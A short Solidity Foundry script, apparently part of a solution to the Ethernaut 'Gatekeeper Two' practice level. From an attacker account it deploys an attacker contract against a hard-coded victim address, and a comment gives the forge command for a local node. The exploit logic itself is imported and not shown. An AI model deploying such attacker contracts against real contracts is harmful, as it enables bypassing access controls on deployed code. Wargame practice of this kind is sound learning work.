// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {GateKeeperTwoAttacker} from "../src/GateKeeperTwoAttacker.sol";
import {Script} from "../lib/forge-std/src/Script.sol";
import {HelperConfigLib} from "./config/HelperConfig.sol";

contract GateKeeperTwoAttackerExecuter is Script, HelperConfigLib {
    function run() public {
        address victimAddr = 0x3063527AEE58c9470AD00E31e4fc6A613b84a8b1; // got it from contract.address
        vm.startBroadcast(ATTACKER_ADDRESS);
        new GateKeeperTwoAttacker(victimAddr);
        vm.stopBroadcast();
    }
}

// forge script script/GateKeeperTwoAttackerExecuter.s.sol:GateKeeperTwoAttackerExecuter --rpc-url http://localhost:8545 -vvv --broadcast --private-key <PRIVATE-KEY>
